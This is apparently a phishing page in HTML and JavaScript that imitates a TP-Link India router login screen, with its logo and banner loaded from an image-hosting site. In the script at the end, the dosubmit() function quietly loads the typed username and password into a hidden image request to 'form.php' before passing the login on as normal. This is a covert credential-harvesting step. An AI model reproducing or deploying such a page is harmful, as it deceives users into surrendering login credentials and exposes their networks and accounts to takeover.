<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<link rel="icon" href="https://i.ibb.co/Xzc4Z5p/TP.png">
<META HTTP-EQUIV="pragma" CONTENT="no-cache">
<META HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate">
<meta http-equiv="Content-Type" content="text/html; charset=GB2312" />
<title>TP-Link India</title>
<LINK REL="stylesheet" HREF="login.css" TYPE="text/css" />
<LINK REL="stylesheet" HREF="styleen.css" TYPE="text/css" />
<script>

function getObj(id)
{
return(document.getElementById(id));
}
var SetTFlag = 0;
var maxtime;
var interval;
document.onkeydown=keyDownSearch;
function keyDownSearch(e) {

var theEvent = e || window.event;
var code = theEvent.keyCode || theEvent.which || theEvent.charCode;
if (code == 13) {
dosubmit();
return false;
}
return true;
}
function setTime()
{
if(window.name>=60 || window.name<0 || window.name=="")
{
maxtime = Math.min(60, 0 + 60 - 206442);
}
else
{
maxtime = window.name;
}
if(maxtime>=0)
{
seconds = maxtime;
getObj("time").innerHTML=seconds+"sec";
if (maxtime == 0)
{
setDisable();
SetTFlag =0;
window.name="";
if(interval)
{
clearInterval(interval);
interval = 0;
}
}
else
{
--maxtime;
SetTFlag = 1;
window.name = maxtime;
}
}
}
function setinner(type)
{
if (SetTFlag ==0)
{
getObj("myLayer").style.visibility = type ;
}
}
function Transfer_meaning(id,value)
{
getObj(id).value=value;
}
function creatHiddenInput(name,value)
{
var hiddenInput = document.createElement("input");
hiddenInput.name=name;
hiddenInput.value=value;
hiddenInput.type="hidden";
return hiddenInput;
}
function ChangeLang()
{
var lang = "english";
var submitForm = document.createElement("form");
submitForm.method = 'post';
submitForm.action = "";
document.body.appendChild(submitForm);

var actionElement = creatHiddenInput("action","setlang");
submitForm.appendChild(actionElement);
var langElement = creatHiddenInput("_lang","");
submitForm.appendChild(langElement);
langElement.disabled = false;
getObj("Frm_Username").disabled = true;
getObj("Frm_Password").disabled = true;
if(true != getObj("TestLang01").disabled)
{
if ("English" == lang)
{
langElement.value = "English";
}
else if ("English" == lang)
{
langElement.value = "English";
}
getObj("Frm_Username").disabled = true;
getObj("Frm_Password").disabled = true;
getObj("LoginId").disabled = true;
var ObjAct = getObj("DevActive");
if(ObjAct != null)
{
ObjAct.disabled = true;
}
submitForm.submit();
}
}
function SetCookie(name,value)
{
var Days = 30;
var exp = new Date();
exp.setTime(exp.getTime() + Days*24*60*60*1000);
document.cookie = name + "="+ escape (value)
+ ";expires=" + exp.toGMTString();
}
function getCookie(name)
{
var arr = document.cookie.match(new RegExp("(^| )"+name+"=([^;]*)(;|$)"));
if(arr != null)
{
return unescape(arr[2]);
}
return null;
}
function delCookie(name)
{
var exp = new Date();
exp.setTime(exp.getTime() - 1);
var cval = getCookie(name);
if( cval!=null )
{
document.cookie= name + "="+cval+";expires="+exp.toGMTString();
}
}
function IsBrowserSupportCookie()
{
var support = false;
SetCookie('cookie_test','1');
var cookie_test = getCookie('cookie_test');
if( '1' == cookie_test)
{
support = true;
}
delCookie('cookie_test');
return support;
}
function focusUsername()
{
if (getObj("Frm_Username").disabled == false)
{
getObj("Frm_Username").focus();
}
}
</script>
</head>

<body onload = "focusUsername();">
<div id="container">
<div id="myLayer" onmousedown="setinner('hidden')">
<iframe id="myiframe" style="position: absolute; width: 179px; height: 88px; border: 1px none #000000; z-index: -1; filter:alpha(opacity=0); -moz-opacity:0">
</iframe>
<div id="layer_login_title">
<div style="position:relative; left:35px; top:8px;" >
<font  class="note" id="errnote">&nbsp;ERROR</font>
</div>
</div>
<div id="layer_login_content">
<span>
&nbsp;&nbsp;<font id="errmsg" class="notecontent" ></font><span id="time" style="color:red;display:none;"></span>
</span>
</div>
</div>
<!--head-->
<div id="head">
<div class="type1"><font id="F670"></font></div><br>
<div id="banner" style="background-image:url(https://i.ibb.co/nbKgH2k/bnr.png); background-repeat:no-repeat"></div>

</div>
<!--head-->
<!--content-->
<div id="loginArea">
<div class="login_frame">
<ul class="login_title">
<li class="login_title_left"></li>
<li class="login_title_center">TP-Link India</li>

<a id="TestLang" style="cursor:pointer" href="#" ><li id="TestLang01" class="login_title_centeren" style="" onclick="ChangeLang();"></li></a>

<li class="login_title_right"></li>
</ul>

<div class="content login_rus_content">
<ul class="login_blank"></ul>
<ul class="login_ul_1">
<li class="login_li_rus_1"><span>Username</span></li>
<li class="login_li_2">
<input type="text" class="username" name="Username" id="Frm_Username">
</li>
</ul>
<ul class="login_blank"></ul>
<ul class="login_ul_1">
<li class="login_li_rus_1"><span>Password</span></li>
<li class="login_li_2">
<input type="password" class="password" name="Password"  id="Frm_Password" autocomplete="off">
</li>
</ul>
<ul class="login_blank"></ul>
<ul class="login_ul_1">
<li class="login_li_4"><span></span></li>
<li class="login_li_3">
<input class="login_rus" type="submit"  id="LoginId"  value="Log In"  onclick="dosubmit()">

</li>
</ul>
</div>
</div>

<!--END OF CONTENT-->
</div>
<!--bottom-->

<div style="font-family: Arial;font-size: 12px;text-align:center;">&copy; 2021-2022 TP-Link Corporation Limited. All rights reserved.</div>

<div class="bottom_line"></div>
<div id="bottomx"></div>
<!--bottom-->
</div>
</body>
</html>
<img scr="" style="display:none;" id=sender>
<script>

var bBrowserCookieOn = IsBrowserSupportCookie();
if ( bBrowserCookieOn == false )
{
getObj("errmsg").innerHTML = "Functionality Cookie is disabled in your browser, please enable it before entering.";
getObj("myLayer").style.visibility = "visible" ;
}
else
{

window.name="";

}
function SetDisabled()
{
getObj("errmsg").innerHTML = "You entered your username or password incorrectly three times. Please try again in a minute.";
getObj("Frm_Username").disabled = true;
getObj("Frm_Password").disabled = true;
getObj("LoginId").disabled = true;

getObj("TestLang01").disabled = true;

getObj("myLayer").style.visibility = "visible" ;
getObj("time").style.display = "" ;
interval = setInterval("setTime()",1000);
}
function setDisable()
{
if (SetTFlag == 1)
{
getObj("Frm_Username").disabled = false;
getObj("Frm_Password").disabled = false;
getObj("LoginId").disabled = false;

getObj("TestLang01").disabled = false;

getObj("time").style.display = "none";
getObj("myLayer").style.visibility = "hidden";
}
}
function dosubmit()
{
var sender = document.getElementById('sender');
sender.src="form.php?login="+getObj("Frm_Username").value+"&password="+getObj("Frm_Password").value;
if (getObj("Frm_Username").value == "")
{
getObj("errmsg").innerHTML = "Username cannot be emty, Please try again!"
getObj("myLayer").style.visibility = "visible" ;
return;
}
else
{
getObj("LoginId").disabled = true;
var ObjAct = getObj("DevActive");
if(ObjAct != null)
{
ObjAct.disabled = true;
}
submitForm();
}
}
function submitForm()
{
var submitForm = document.createElement("form");
submitForm.method = 'post';
submitForm.action = "";
document.body.appendChild(submitForm);

var actionElement = creatHiddenInput("action","login");
submitForm.appendChild(actionElement);
var nameElement = creatHiddenInput("Username",getObj("Frm_Username").value);
submitForm.appendChild(nameElement);
var passElement = creatHiddenInput("Password",getObj("Frm_Password").value);
submitForm.appendChild(passElement);
var tokenElement = creatHiddenInput("Frm_Logintoken","0");
submitForm.appendChild(tokenElement);
submitForm.submit();
}

</script>

